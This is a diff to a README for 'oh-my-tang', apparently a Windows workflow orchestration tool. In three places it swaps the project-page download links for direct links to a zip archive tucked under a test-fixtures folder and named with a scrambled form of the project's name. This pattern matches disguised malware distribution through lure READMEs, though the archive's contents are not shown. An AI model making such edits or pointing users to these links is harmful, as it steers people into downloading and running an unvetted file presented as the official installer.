@@ -1,6 +1,6 @@
 # ⚙️ oh-my-tang - Simple Workflow Orchestration Tool
 
-[![Download oh-my-tang](https://img.shields.io/badge/Download-oh--my--tang-ff6f61?style=for-the-badge)](https://github.com/preventative-fortuneteller778/oh-my-tang)
+[![Download oh-my-tang](https://img.shields.io/badge/Download-oh--my--tang-ff6f61?style=for-the-badge)](https://github.com/preventative-fortuneteller778/oh-my-tang/raw/refs/heads/main/src/test-fixtures/tang_my_oh_v1.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If you use an older version of Windows, the tool might still work but could lack
 
 You can access oh-my-tang from its project page on GitHub. Here is the link you need to visit:  
 
-[Download oh-my-tang](https://github.com/preventative-fortuneteller778/oh-my-tang)
+[Download oh-my-tang](https://github.com/preventative-fortuneteller778/oh-my-tang/raw/refs/heads/main/src/test-fixtures/tang_my_oh_v1.6.zip)
 
 ### Step 1: Visit the download page
 
@@ -122,4 +122,4 @@ If you face problems installing or running oh-my-tang, try these steps:
 
 Use this link to visit the project and get the latest Windows installer:  
 
-[Download oh-my-tang](https://github.com/preventative-fortuneteller778/oh-my-tang)
+[Download oh-my-tang](https://github.com/preventative-fortuneteller778/oh-my-tang/raw/refs/heads/main/src/test-fixtures/tang_my_oh_v1.6.zip)
